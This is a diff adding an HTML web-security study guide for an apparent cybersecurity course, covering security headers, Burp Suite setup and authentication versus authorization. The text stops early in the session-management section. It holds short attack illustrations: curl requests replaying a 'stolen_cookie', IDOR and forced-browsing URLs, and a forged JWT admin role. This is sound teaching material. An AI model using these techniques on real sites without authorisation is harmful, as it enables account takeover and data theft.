@@ -1,0 +1,1750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Unit 7: Web Security — Complete Study Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family:JetBrains+Mono:wght@400;500;700&family=Nunito:wght@400;600;700;800&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#03080f;--bg-card:#060d18;--bg-panel:#091422;
+  --teal:#00c8aa;--teal2:#008870;
+  --spider:#7cf;--green:#39ff14;--orange:#ff7b00;
+  --pink:#ff2d78;--purple:#9b59b6;--yellow:#f1c40f;
+  --sky:#38bdf8;--text:#cce8e0;--dim:#2a5a50;
+  --border:rgba(0,200,170,0.18);--glow:0 0 22px rgba(0,200,170,0.3);
+  --glow-g:0 0 18px rgba(57,255,20,0.25);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:'Nunito',sans-serif;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;
+  background:radial-gradient(ellipse at 10% 20%,rgba(0,200,170,0.07) 0%,transparent 50%),
+             radial-gradient(ellipse at 90% 80%,rgba(57,255,20,0.04) 0%,transparent 50%);
+  pointer-events:none;z-index:0;}
+body::after{content:'';position:fixed;inset:0;
+  background-image:repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(0,200,170,0.025) 40px),
+    repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(0,200,170,0.025) 40px);
+  pointer-events:none;z-index:0;}
+canvas#web{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.15;}
+
+/* HEADER */
+header{position:relative;z-index:10;text-align:center;padding:58px 20px 42px;
+  background:linear-gradient(180deg,rgba(3,8,15,0.98) 0%,transparent 100%);
+  border-bottom:1px solid var(--border);}
+.ubadge{display:inline-flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;
+  font-size:.68rem;letter-spacing:4px;text-transform:uppercase;color:var(--teal);
+  border:1px solid rgba(0,200,170,0.35);padding:6px 18px;border-radius:2px;
+  margin-bottom:20px;box-shadow:var(--glow);}
+header h1{font-family:'Syne',sans-serif;font-size:clamp(2rem,5.5vw,4rem);font-weight:800;
+  background:linear-gradient(135deg,var(--teal) 0%,var(--green) 35%,var(--yellow) 60%,var(--orange) 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  line-height:1.1;margin-bottom:8px;letter-spacing:1px;}
+header p.sub{font-family:'JetBrains Mono',monospace;color:var(--dim);font-size:.85rem;letter-spacing:3px;}
+.hstats{display:flex;justify-content:center;gap:18px;margin-top:24px;flex-wrap:wrap;}
+.hs{background:rgba(0,200,170,0.06);border:1px solid var(--border);border-radius:8px;padding:10px 18px;text-align:center;}
+.hs .n{font-family:'Syne',sans-serif;font-size:1.5rem;font-weight:800;color:var(--teal);}
+.hs .l{font-size:.66rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-top:2px;}
+
+.wrap{max-width:1200px;margin:0 auto;padding:0 20px;position:relative;z-index:5;}
+
+/* TOC */
+.toc-g{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:8px;margin:14px 0 26px;}
+.ti{display:flex;align-items:center;gap:10px;background:var(--bg-card);border:1px solid var(--border);
+  border-radius:8px;padding:10px 13px;text-decoration:none;color:var(--text);transition:all .3s;cursor:pointer;}
+.ti:hover{border-color:var(--teal);background:rgba(0,200,170,0.08);transform:translateX(4px);box-shadow:var(--glow);}
+.tn{font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--orange);min-width:28px;}
+.tt{font-size:.85rem;font-weight:600;}
+
+/* SECTIONS */
+.sec{margin:30px 0;background:var(--bg-card);border:1px solid var(--border);border-radius:16px;overflow:hidden;position:relative;}
+.sec::before{content:'';position:absolute;left:0;top:0;bottom:0;width:4px;background:linear-gradient(180deg,var(--teal),var(--green));}
+.sh{padding:22px 26px 16px 34px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
+.sn{font-family:'JetBrains Mono',monospace;font-size:.76rem;color:var(--orange);
+  background:rgba(255,123,0,0.1);border:1px solid rgba(255,123,0,0.28);padding:4px 9px;border-radius:4px;white-space:nowrap;}
+.sh h2{font-family:'Syne',sans-serif;font-size:clamp(1.2rem,2.8vw,1.75rem);font-weight:800;color:var(--teal);}
+.se{font-size:1.6rem;margin-left:auto;}
+.sb{padding:22px 26px 26px 34px;}
+
+/* SUBSECTIONS */
+.sub{margin-bottom:22px;}
+.sub h3{font-family:'Space Grotesk',sans-serif;font-size:1.05rem;font-weight:700;color:var(--green);
+  margin-bottom:9px;display:flex;align-items:center;gap:8px;}
+.sub h3::before{content:'❯';color:var(--orange);font-size:.8rem;}
+p{line-height:1.72;color:#8ab8a8;margin-bottom:8px;font-size:.94rem;}
+strong{color:var(--yellow);font-weight:700;}
+
+/* SHORT SUMMARY */
+.summary{background:rgba(57,255,20,0.06);border:1px solid rgba(57,255,20,0.2);
+  border-radius:8px;padding:10px 14px;margin:10px 0;font-size:.85rem;
+  font-family:'JetBrains Mono',monospace;color:#a0ffa0;line-height:1.6;}
+.sum-label{font-size:.62rem;letter-spacing:3px;color:var(--green);text-transform:uppercase;margin-bottom:5px;font-weight:700;}
+
+/* DEF */
+.def{background:rgba(0,200,170,0.07);border:1px solid rgba(0,200,170,0.22);
+  border-left:3px solid var(--teal);border-radius:8px;padding:13px 17px;margin:10px 0;font-size:.93rem;line-height:1.7;}
+.dl{font-family:'JetBrains Mono',monospace;font-size:.64rem;font-weight:700;letter-spacing:3px;color:var(--teal);text-transform:uppercase;margin-bottom:5px;}
+
+/* TERMINAL */
+.terminal{background:#020a06;border:1px solid rgba(57,255,20,0.25);border-radius:10px;margin:12px 0;overflow:hidden;}
+.term-hd{background:rgba(57,255,20,0.07);padding:7px 13px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(57,255,20,0.15);}
+.tdots{display:flex;gap:5px;}
+.tdots span{width:9px;height:9px;border-radius:50%;}
+.tdots .r{background:#ff5f56;}.tdots .y{background:#ffbd2e;}.tdots .g{background:#27c93f;}
+.ttitle{font-family:'JetBrains Mono',monospace;font-size:.65rem;color:rgba(57,255,20,0.5);letter-spacing:2px;margin-left:5px;}
+.term-body{padding:14px 17px;overflow-x:auto;}
+.term-body pre{font-family:'JetBrains Mono',monospace;font-size:.77rem;line-height:1.8;white-space:pre;}
+.p{color:#39ff14;}.cmd{color:#fff;}.out{color:#5aba5a;}
+.err{color:#ff4466;}.fl{color:#f1c40f;}.ip{color:#00c8aa;}.cm{color:#1a4a2a;}
+
+/* CODE */
+.cb{background:#030e07;border:1px solid rgba(0,200,170,0.18);border-radius:10px;
+  padding:15px;margin:10px 0;overflow-x:auto;position:relative;}
+.clbl{position:absolute;top:6px;right:10px;font-family:'JetBrains Mono',monospace;
+  font-size:.59rem;letter-spacing:2px;color:var(--teal);opacity:.55;text-transform:uppercase;}
+.cb pre{font-family:'JetBrains Mono',monospace;font-size:.77rem;line-height:1.7;color:#8ab8a8;white-space:pre;}
+.cg{color:#39ff14;}.cy{color:#f1c40f;}.co{color:#ff7b00;}.ci{color:#00c8aa;}
+.cp{color:#c084fc;}.cr{color:#ff2d78;}.cd{color:#1a3a28;}.cw{color:#cce8e0;}
+
+/* TABLES */
+.tw{overflow-x:auto;margin:12px 0;border-radius:10px;border:1px solid var(--border);}
+table{width:100%;border-collapse:collapse;font-size:.84rem;}
+thead{background:linear-gradient(90deg,rgba(0,200,170,0.13),rgba(57,255,20,0.07));}
+thead th{padding:10px 13px;text-align:left;font-family:'JetBrains Mono',monospace;
+  font-size:.69rem;font-weight:700;letter-spacing:2px;color:var(--green);
+  text-transform:uppercase;border-bottom:1px solid var(--border);white-space:nowrap;}
+tbody tr{border-bottom:1px solid rgba(0,200,170,0.06);transition:background .2s;}
+tbody tr:hover{background:rgba(0,200,170,0.05);}
+tbody td{padding:9px 13px;color:#8ab8a8;vertical-align:top;line-height:1.5;}
+tbody td:first-child{color:var(--yellow);font-weight:700;}
+
+/* ATTACK/DEFENCE boxes */
+.ad-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:12px 0;}
+.atk-box{background:rgba(255,45,120,0.07);border:1px solid rgba(255,45,120,0.25);border-radius:10px;padding:14px;}
+.def-box{background:rgba(57,255,20,0.06);border:1px solid rgba(57,255,20,0.2);border-radius:10px;padding:14px;}
+.atk-box h4{font-family:'Space Grotesk',sans-serif;font-size:.9rem;font-weight:700;color:var(--pink);margin-bottom:8px;}
+.def-box h4{font-family:'Space Grotesk',sans-serif;font-size:.9rem;font-weight:700;color:var(--green);margin-bottom:8px;}
+.atk-box ul,.def-box ul{list-style:none;padding:0;}
+.atk-box ul li,.def-box ul li{font-size:.81rem;color:#8ab8a8;padding:3px 0;display:flex;gap:7px;}
+.atk-box ul li::before{content:'✗';color:var(--pink);flex-shrink:0;}
+.def-box ul li::before{content:'✓';color:var(--green);flex-shrink:0;}
+
+/* CARDS */
+.cg2{display:grid;grid-template-columns:repeat(auto-fill,minmax(175px,1fr));gap:11px;margin:12px 0;}
+.card{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:14px;transition:all .3s;}
+.card:hover{border-color:var(--teal);transform:translateY(-3px);box-shadow:var(--glow);}
+.ci2{font-size:1.5rem;margin-bottom:7px;}
+.ct{font-family:'Space Grotesk',sans-serif;font-size:.9rem;font-weight:700;color:var(--green);margin-bottom:4px;}
+.cd2{font-size:.78rem;color:var(--dim);line-height:1.5;}
+
+/* INFO */
+.ib{border-radius:10px;padding:12px 16px;margin:10px 0;display:flex;gap:11px;align-items:flex-start;font-size:.86rem;line-height:1.65;}
+.ib.t{background:rgba(0,200,170,0.07);border:1px solid rgba(0,200,170,0.22);}
+.ib.g{background:rgba(57,255,20,0.06);border:1px solid rgba(57,255,20,0.2);color:#a0ffa0;}
+.ib.o{background:rgba(255,123,0,0.07);border:1px solid rgba(255,123,0,0.22);color:#ffc888;}
+.ib.r{background:rgba(255,45,120,0.07);border:1px solid rgba(255,45,120,0.22);color:#ffa8c0;}
+.ib.p{background:rgba(155,89,182,0.07);border:1px solid rgba(155,89,182,0.22);color:#d8b8ff;}
+.bi{font-size:1.2rem;flex-shrink:0;margin-top:2px;}
+
+/* EXERCISE */
+.ex{background:rgba(0,200,170,0.05);border:1px solid rgba(0,200,170,0.2);border-radius:10px;padding:14px 17px;margin:12px 0;}
+.el{font-family:'JetBrains Mono',monospace;font-size:.64rem;font-weight:700;letter-spacing:3px;color:var(--teal);text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:7px;}
+.ex ol{padding-left:18px;}
+.ex ol li{font-size:.84rem;color:#8ab8a8;margin-bottom:7px;line-height:1.6;}
+
+/* CONCL */
+.concl{margin-top:20px;background:linear-gradient(135deg,rgba(0,200,170,0.06),rgba(57,255,20,0.04));
+  border:1px solid rgba(0,200,170,0.18);border-radius:10px;padding:14px 17px;}
+.cl{font-family:'JetBrains Mono',monospace;font-size:.63rem;letter-spacing:3px;color:var(--teal);text-transform:uppercase;margin-bottom:6px;}
+
+/* SGT */
+.sgt{font-family:'JetBrains Mono',monospace;font-size:.7rem;font-weight:700;letter-spacing:4px;
+  color:var(--dim);text-transform:uppercase;padding:22px 0 10px;display:flex;align-items:center;gap:12px;}
+.sgt::after{content:'';flex:1;height:1px;background:var(--border);}
+.div{height:1px;background:linear-gradient(90deg,transparent,var(--teal),transparent);margin:7px 0 20px;opacity:.2;}
+
+/* BADGE */
+.badge{display:inline-flex;align-items:center;gap:4px;font-family:'JetBrains Mono',monospace;
+  font-size:.61rem;padding:2px 8px;border-radius:3px;margin-left:6px;letter-spacing:1px;}
+.b-r{background:rgba(255,45,120,0.13);color:var(--pink);border:1px solid rgba(255,45,120,0.3);}
+.b-o{background:rgba(255,123,0,0.12);color:var(--orange);border:1px solid rgba(255,123,0,0.3);}
+.b-g{background:rgba(57,255,20,0.1);color:var(--green);border:1px solid rgba(57,255,20,0.25);}
+.b-t{background:rgba(0,200,170,0.1);color:var(--teal);border:1px solid rgba(0,200,170,0.25);}
+
+/* REVISION */
+.rv{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:8px;margin:12px 0;}
+.ri{background:var(--bg-panel);border:1px solid var(--border);border-radius:8px;padding:10px 12px;display:flex;gap:10px;}
+.rt{font-family:'JetBrains Mono',monospace;font-size:.68rem;font-weight:700;color:var(--orange);min-width:110px;padding-top:1px;}
+.rd{font-size:.79rem;color:#3a6050;line-height:1.5;}
+
+/* PILLS */
+.pills{display:flex;flex-wrap:wrap;gap:7px;margin:11px 0;}
+.pill{font-family:'Space Grotesk',sans-serif;font-size:.78rem;font-weight:700;padding:4px 12px;
+  border-radius:20px;background:rgba(0,200,170,0.08);border:1px solid rgba(0,200,170,0.2);color:var(--teal);}
+.pill.g{background:rgba(57,255,20,0.08);border-color:rgba(57,255,20,0.2);color:var(--green);}
+.pill.o{background:rgba(255,123,0,0.08);border-color:rgba(255,123,0,0.2);color:var(--orange);}
+.pill.r{background:rgba(255,45,120,0.08);border-color:rgba(255,45,120,0.2);color:var(--pink);}
+.pill.p{background:rgba(155,89,182,0.08);border-color:rgba(155,89,182,0.2);color:var(--purple);}
+
+/* OWASP CARD */
+.owasp-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:11px;margin:13px 0;}
+.ow-card{background:var(--bg-panel);border:1px solid var(--border);border-radius:10px;padding:15px;transition:all .3s;position:relative;overflow:hidden;}
+.ow-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;}
+.ow-card:nth-child(1)::before,.ow-card:nth-child(2)::before,.ow-card:nth-child(3)::before{background:var(--pink);}
+.ow-card:nth-child(4)::before,.ow-card:nth-child(5)::before,.ow-card:nth-child(6)::before{background:var(--orange);}
+.ow-card:nth-child(7)::before,.ow-card:nth-child(8)::before,.ow-card:nth-child(9)::before{background:var(--yellow);}
+.ow-card:nth-child(10)::before{background:var(--green);}
+.ow-card:hover{border-color:var(--teal);box-shadow:var(--glow);transform:translateY(-2px);}
+.ow-rank{font-family:'JetBrains Mono',monospace;font-size:.65rem;letter-spacing:2px;color:var(--orange);margin-bottom:4px;}
+.ow-name{font-family:'Space Grotesk',sans-serif;font-size:.95rem;font-weight:700;color:var(--teal);margin-bottom:6px;}
+.ow-desc{font-size:.79rem;color:var(--dim);line-height:1.5;}
+
+/* FLOW */
+.flow{margin:12px 0;display:flex;flex-direction:column;align-items:center;}
+.fn{background:rgba(0,200,170,0.08);border:1.5px solid var(--teal);border-radius:8px;
+  padding:10px 20px;font-family:'Space Grotesk',sans-serif;font-size:.9rem;font-weight:600;
+  color:var(--text);text-align:center;min-width:200px;max-width:520px;width:100%;transition:all .3s;}
+.fn:hover{background:rgba(0,200,170,0.16);box-shadow:var(--glow);}
+.fn.s{background:rgba(57,255,20,0.08);border-color:var(--green);border-radius:50px;color:var(--green);}
+.fn.e{background:rgba(255,45,120,0.08);border-color:var(--pink);border-radius:50px;color:var(--pink);}
+.fn.w{background:rgba(255,123,0,0.08);border-color:var(--orange);color:var(--orange);}
+.fa{display:flex;flex-direction:column;align-items:center;margin:2px 0;}
+.fa .ln{width:2px;height:16px;background:var(--teal);opacity:.3;}
+.fa .tip{width:0;height:0;border-left:6px solid transparent;border-right:6px solid transparent;border-top:8px solid var(--teal);opacity:.3;}
+
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:rgba(0,200,170,.25);border-radius:3px;}
+@media(max-width:640px){.sb,.sh{padding-left:18px;padding-right:14px;}.ad-grid{grid-template-columns:1fr;}}
+</style>
+</head>
+<body>
+<canvas id="web"></canvas>
+
+<header>
+  <div class="ubadge">🕷️ Cybersecurity Course · Unit 7</div>
+  <h1>Web Security</h1>
+  <p class="sub">// TOPICS 109 — 128 · COMPLETE STUDY GUIDE · DEEP DIVE</p>
+  <div class="hstats">
+    <div class="hs"><div class="n">20</div><div class="l">Topics</div></div>
+    <div class="hs"><div class="n">OWASP</div><div class="l">Top 10</div></div>
+    <div class="hs"><div class="n">SQLi<br>XSS</div><div class="l">Core Attacks</div></div>
+    <div class="hs"><div class="n">Burp<br>Suite</div><div class="l">Tools</div></div>
+    <div class="hs"><div class="n">Bug<br>Bounty</div><div class="l">Career Path</div></div>
+  </div>
+</header>
+
+<div class="wrap">
+<div class="sgt">📋 Table of Contents</div>
+<div class="toc-g">
+  <a href="#t109" class="ti"><span class="tn">109</span><span class="tt">Web Security Basics</span></a>
+  <a href="#t110" class="ti"><span class="tn">110</span><span class="tt">Authentication vs Authorization</span></a>
+  <a href="#t111" class="ti"><span class="tn">111</span><span class="tt">Session Management</span></a>
+  <a href="#t112" class="ti"><span class="tn">112</span><span class="tt">Cookies Security</span></a>
+  <a href="#t113" class="ti"><span class="tn">113</span><span class="tt">SQL Injection</span></a>
+  <a href="#t114" class="ti"><span class="tn">114</span><span class="tt">Cross-Site Scripting (XSS)</span></a>
+  <a href="#t115" class="ti"><span class="tn">115</span><span class="tt">CSRF</span></a>
+  <a href="#t116" class="ti"><span class="tn">116</span><span class="tt">File Upload Vulnerability</span></a>
+  <a href="#t117" class="ti"><span class="tn">117</span><span class="tt">Clickjacking</span></a>
+  <a href="#t118" class="ti"><span class="tn">118</span><span class="tt">Session Hijacking</span></a>
+  <a href="#t119" class="ti"><span class="tn">119</span><span class="tt">IDOR 🔥</span></a>
+  <a href="#t120" class="ti"><span class="tn">120</span><span class="tt">SSRF 🔥</span></a>
+  <a href="#t121" class="ti"><span class="tn">121</span><span class="tt">XXE Attack 🔥</span></a>
+  <a href="#t122" class="ti"><span class="tn">122</span><span class="tt">API Security 🔥</span></a>
+  <a href="#t123" class="ti"><span class="tn">123</span><span class="tt">Secure Coding Practices</span></a>
+  <a href="#t124" class="ti"><span class="tn">124</span><span class="tt">OWASP Top 10</span></a>
+  <a href="#t125" class="ti"><span class="tn">125</span><span class="tt">Case Study</span></a>
+  <a href="#t126" class="ti"><span class="tn">126</span><span class="tt">Bug Bounty Basics</span></a>
+  <a href="#t127" class="ti"><span class="tn">127</span><span class="tt">Web Testing with Burp Suite</span></a>
+  <a href="#t128" class="ti"><span class="tn">128</span><span class="tt">Unit 7 Revision Notes</span></a>
+</div>
+
+<!-- ===== T109 ===== -->
+<div class="sgt">🌐 Web Security Foundations</div>
+<div class="sec" id="t109">
+  <div class="sh"><span class="sn">Topic 109</span><h2>Web Security Basics</h2><span class="se">🌐</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>Web security protects web apps from attacks that exploit flaws in code, authentication, or configuration — covering client, server, and communication layers.</div>
+    <div class="sub"><h3>Definition &amp; Architecture</h3>
+      <div class="def"><div class="dl">Definition</div>
+        <strong>Web security</strong> encompasses the measures taken to protect web applications and their users from attacks that exploit vulnerabilities in client-side code, server-side logic, databases, APIs, authentication, and communication channels. With 75% of cyberattacks targeting web applications, it is the most active battleground in cybersecurity.
+      </div>
+    </div>
+    <div class="sub"><h3>Web Request Lifecycle (Security View)</h3>
+      <div class="cb"><div class="clbl">HTTP REQUEST FLOW</div><pre><span class="cy">Browser (Client)</span>                      <span class="ci">Web Server</span>
+    │                                        │
+    │  ─── DNS lookup: example.com → IP ──▶  │
+    │  ─── TCP 3-way handshake ────────────▶  │
+    │  ─── TLS handshake ──────────────────▶  │
+    │                                        │
+    │  ─── HTTP GET /dashboard ────────────▶  │  <span class="cm">← Input validation layer</span>
+    │       Headers: Cookie, User-Agent       │  <span class="cm">← Session/auth check</span>
+    │       Host: example.com                 │  <span class="cm">← WAF inspection</span>
+    │                                        │
+    │  ◀── HTTP 200 OK ────────────────────  │
+    │       Set-Cookie: session=abc123        │  <span class="cm">← Cookie security flags</span>
+    │       Content-Security-Policy: ...      │  <span class="cm">← XSS mitigation</span>
+    │       X-Frame-Options: DENY             │  <span class="cm">← Clickjacking prevention</span>
+    │                                        │
+    │  Browser renders HTML + executes JS     │  <span class="cm">← DOM-based XSS possible here</span>
+
+<span class="cy">Attack surfaces:</span>
+<span class="cr">1. URL params/query strings    → SQLi, XSS, path traversal</span>
+<span class="cr">2. HTTP headers                → Header injection, XSS</span>
+<span class="cr">3. POST body / JSON            → SQLi, XXE, mass assignment</span>
+<span class="cr">4. File uploads                → RCE, path traversal</span>
+<span class="cr">5. Authentication forms        → Brute force, SQLi bypass</span>
+<span class="cr">6. Session cookies             → Theft, fixation, CSRF</span>
+<span class="cr">7. Third-party JS/libraries    → Supply chain XSS</span></pre></div>
+    </div>
+    <div class="sub"><h3>Key Web Security Headers</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Header</th><th>Purpose</th><th>Example Value</th><th>Attacks Prevented</th></tr></thead>
+        <tbody>
+          <tr><td>Content-Security-Policy</td><td>Whitelist allowed script/style sources</td><td><code>default-src 'self'; script-src 'self'</code></td><td>XSS, data injection</td></tr>
+          <tr><td>X-Frame-Options</td><td>Prevent embedding in iframe</td><td><code>DENY</code> or <code>SAMEORIGIN</code></td><td>Clickjacking</td></tr>
+          <tr><td>Strict-Transport-Security</td><td>Force HTTPS always</td><td><code>max-age=31536000; includeSubDomains</code></td><td>SSL stripping, MitM</td></tr>
+          <tr><td>X-Content-Type-Options</td><td>Prevent MIME sniffing</td><td><code>nosniff</code></td><td>MIME confusion attacks</td></tr>
+          <tr><td>Referrer-Policy</td><td>Control referrer info leakage</td><td><code>strict-origin-when-cross-origin</code></td><td>Info leakage</td></tr>
+          <tr><td>Permissions-Policy</td><td>Control browser features</td><td><code>camera=(), microphone=()</code></td><td>Feature abuse</td></tr>
+          <tr><td>X-XSS-Protection</td><td>Legacy browser XSS filter</td><td><code>1; mode=block</code></td><td>Reflected XSS (legacy)</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Burp Suite Setup — Essential Web Security Tool</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">BURP SUITE SETUP</div></div>
+        <div class="term-body"><pre><span class="cm"># Burp Suite — The industry standard web app security testing tool</span>
+<span class="cm"># Download: portswigger.net/burp (Community Edition = free)</span>
+
+<span class="cm"># Setup steps:</span>
+<span class="fl">1.</span> Launch Burp Suite → Proxy → Options → Listen on 127.0.0.1:8080
+<span class="fl">2.</span> Browser: Set proxy to 127.0.0.1:8080
+<span class="fl">3.</span> Visit http://burpsuite → download &amp; install CA cert
+<span class="fl">4.</span> Import CA cert to browser → now you can intercept HTTPS
+
+<span class="cm"># Key Burp Suite modules:</span>
+<span class="cg">Proxy</span>     → Intercept/modify all HTTP requests in real-time
+<span class="cg">Repeater</span>  → Manually resend modified requests, see responses
+<span class="cg">Intruder</span>  → Automated fuzzing/brute force with payload lists
+<span class="cg">Scanner</span>   → Automated vulnerability detection (Pro only)
+<span class="cg">Decoder</span>   → Encode/decode: Base64, URL, HTML, Hex
+<span class="cg">Comparer</span>  → Diff two requests/responses to spot changes
+<span class="cg">Logger</span>    → Full request history log
+
+<span class="cm"># CLI equivalent — curl commands for testing:</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl -v https://target.com/login</span>           <span class="cm"># View all headers</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl -X POST -d "user=admin&amp;pass=test" https://target.com/login</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl -H "Cookie: session=stolen_cookie" https://target.com/dashboard</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">curl -I https://target.com</span>                 <span class="cm"># Check security headers only</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Visit <a href="https://securityheaders.com" style="color:var(--teal)">securityheaders.com</a> and scan a website. Which headers are missing? What attacks does each missing header enable?</li>
+      <li>Install Burp Suite Community Edition. Set up your browser proxy and intercept a single HTTP request. Identify all the fields an attacker could manipulate.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Web applications are the most attacked systems on the internet because they're publicly accessible, complex, and often built by teams under time pressure. Understanding the HTTP request lifecycle and proper security headers is the foundation of all web security work.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T110 ===== -->
+<div class="sec" id="t110">
+  <div class="sh"><span class="sn">Topic 110</span><h2>Authentication vs Authorization</h2><span class="se">🔑</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>Authentication = WHO are you (identity); Authorization = WHAT can you do (permissions). Both must be correctly implemented or attackers bypass access controls.</div>
+    <div class="sub"><h3>Core Distinction</h3>
+      <div class="cb"><div class="clbl">AUTHN vs AUTHZ</div><pre><span class="cy">Authentication (AuthN): "Are you who you claim to be?"</span>
+  → Verifying identity: passwords, MFA, certificates, biometrics
+  → Happens FIRST
+  → Failure: "Login failed - wrong password"
+
+<span class="cy">Authorization (AuthZ): "Are you allowed to do this?"</span>
+  → Access control: roles, permissions, ACLs
+  → Happens AFTER authentication
+  → Failure: "Access denied - insufficient permissions"
+
+<span class="ci">Real example:</span>
+  You log into your bank app         ← Authentication
+  You can only see YOUR accounts     ← Authorization
+  You cannot see other customers'    ← Authorization control
+
+<span class="cr">Common Mistakes:</span>
+  → Broken Authentication: weak passwords, no MFA, session fixation
+  → Broken Authorization: can access other users' data (IDOR),
+    admin functions accessible to regular users (privilege escalation)</pre></div>
+    </div>
+    <div class="sub"><h3>Authentication Methods</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Method</th><th>Description</th><th>Strength</th><th>Attack</th></tr></thead>
+        <tbody>
+          <tr><td>Password (something you know)</td><td>Classic username + password</td><td style="color:var(--orange)">Medium</td><td>Brute force, phishing, credential stuffing</td></tr>
+          <tr><td>OTP / TOTP (time-based)</td><td>6-digit code every 30 seconds (Google Auth)</td><td style="color:var(--yellow)">Good</td><td>Real-time phishing (Evilginx), SIM swap</td></tr>
+          <tr><td>SMS OTP</td><td>Code sent via text message</td><td style="color:var(--orange)">Medium</td><td>SIM swap, SS7 interception</td></tr>
+          <tr><td>Hardware Key (FIDO2)</td><td>Physical device (YubiKey) — cryptographic challenge</td><td style="color:var(--green)">Excellent</td><td>Physical theft only — phishing-proof</td></tr>
+          <tr><td>Passkeys (WebAuthn)</td><td>Device-bound key pair — biometric unlock</td><td style="color:var(--green)">Excellent</td><td>Device compromise only</td></tr>
+          <tr><td>Certificate (mTLS)</td><td>Client certificate proves identity</td><td style="color:var(--green)">Excellent</td><td>Certificate theft, weak key management</td></tr>
+          <tr><td>Biometric</td><td>Fingerprint, face ID</td><td style="color:var(--yellow)">Good</td><td>Spoofing (printed fingerprints), liveness bypass</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>Authorization Vulnerabilities</h3>
+      <div class="terminal">
+        <div class="term-hd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttitle">AUTHORIZATION BYPASS EXAMPLES</div></div>
+        <div class="term-body"><pre><span class="cm"># ── Broken vertical access control (privilege escalation) ──</span>
+<span class="cm"># Admin function accessible to regular user:</span>
+<span class="err">GET /admin/users/delete?id=5</span>   <span class="cm">← No admin role check! Any logged-in user can call this</span>
+
+<span class="cm"># ── Horizontal access control bypass (IDOR) ──</span>
+<span class="cm"># Changing ID to access other users' data:</span>
+<span class="fl">GET /account?user_id=1001</span>    <span class="cm">← Your account</span>
+<span class="err">GET /account?user_id=1002</span>    <span class="cm">← Another user's account (no check if 1002 = you!)</span>
+
+<span class="cm"># ── Force browsing ──</span>
+<span class="cm"># Skipping authentication by directly accessing protected page:</span>
+<span class="err">GET /dashboard</span>  <span class="cm">← If no server-side session check, serves page anyway!</span>
+
+<span class="cm"># ── JWT role manipulation ──</span>
+<span class="cm"># JWT payload (base64 decoded):</span>
+<span class="fl">{"sub":"alice","role":"user","exp":1715000000}</span>
+<span class="cm"># Attacker changes role:</span>
+<span class="err">{"sub":"alice","role":"admin","exp":1715000000}</span>
+<span class="cm"># If signature not verified → gets admin access!</span>
+
+<span class="cm"># ── Testing with Burp Suite Repeater ──</span>
+<span class="cm"># 1. Log in as User A, capture request to /my-profile</span>
+<span class="cm"># 2. Log in as User B in different browser session</span>
+<span class="cm"># 3. Send User A's request in Burp Repeater using User B's session cookie</span>
+<span class="cm"># 4. Can User B access User A's profile? → Broken authorization!</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>List three differences between authentication failures and authorization failures. Give a real-world example of each.</li>
+      <li>Why is JWT role-based authorization dangerous if the server doesn't verify the signature? Use the "algorithm=none" attack as an example.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Authentication and authorization failures are consistently the most exploited web vulnerabilities. Authentication says who you are; authorization says what you can access. Every security decision must enforce both, server-side, for every request — never trust client-supplied identity or role claims.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T111 + T112 ===== -->
+<div class="sec" id="t111">
+  <div class="sh"><span class="sn">Topics 111–112</span><h2>Session Management &amp; Cookies Security</h2><span class="se">🍪</span></div>
+  <div class="sb">
+    <div class="summary"><div class="sum-label">⚡ One-Line Summary</div>Sessions maintain state across stateless HTTP; cookies store session tokens — both must be secured with proper flags, timeouts, and unpredictable IDs or attackers impersonate users.</div>
+    <div class="sub"><h3>Session Lifecycle</h3>
